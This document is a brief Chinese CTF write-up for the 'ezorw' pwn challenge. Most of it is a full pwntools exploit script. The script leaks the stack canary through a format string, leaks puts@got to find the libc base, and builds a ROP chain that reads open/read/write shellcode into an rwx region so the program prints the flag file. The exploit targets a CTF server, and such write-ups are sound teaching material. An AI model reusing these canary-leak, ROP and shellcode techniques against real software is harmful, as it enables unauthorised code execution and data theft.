# W3 orw rop

## 文件分析

下载`ezorw`, NX on, PIE off, Canary on, RELRO partial  
ghidra分析为64位程序

## 逆向

程序存在一片区域rwx，并且禁用了system，那么只要将shellcode写到那片区域，
再执行就可以了

那么没有gadgets怎么办？libc里应有尽有，只要知道了libcBase就可以拿到

## EXPLOIT

```python
from pwn import *
context.arch = 'amd64'
sh = remote('node4.buuoj.cn', 28119)

# payload 1
sh.sendline(b'%11$p') # get canary
sh.recvline(b'x\n') # skip
canary = int(sh.recvline()[:18], 16)

elf = ELF('ezorw')
putsGot = elf.got['puts']
main = elf.symbols['main']

# payload 2, notice seccomp requires a balanced stack; place putsGot on stack
retAddr = 0x4013b2
sh.sendline(b'0'*0x28 + p64(canary) + b'0'*8 + p64(retAddr) + p64(main) + p64(putsGot))

# payload 3, get puts@got
sh.sendlineafter(b'x\n', b'%13$s')
putsGotAddr = u64(sh.recvline()[:6] + b'\0\0')

libcBase = putsGotAddr - 0x80ed0
popRsi = libcBase + 0x2be51
popRdxRbx = libcBase + 0x90529 # some gadgets in libc
readPlt = elf.plt['read']

# payload 4, make a read call to read shellcode to 0x66660000
sh.sendlineafter(b'now', b'0'*0x28 + p64(canary) + b'0'*8 + p64(popRsi) + p64(0x66660000) + p64(popRdxRbx) + p64(0x100) + p64(0) + p64(readPlt) + p64(0x66660000))

# payload 5, create orw shellcode
shc = asm(shellcraft.open('./flag') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
sh.sendline(shc)

sh.interactive()
```

Done.
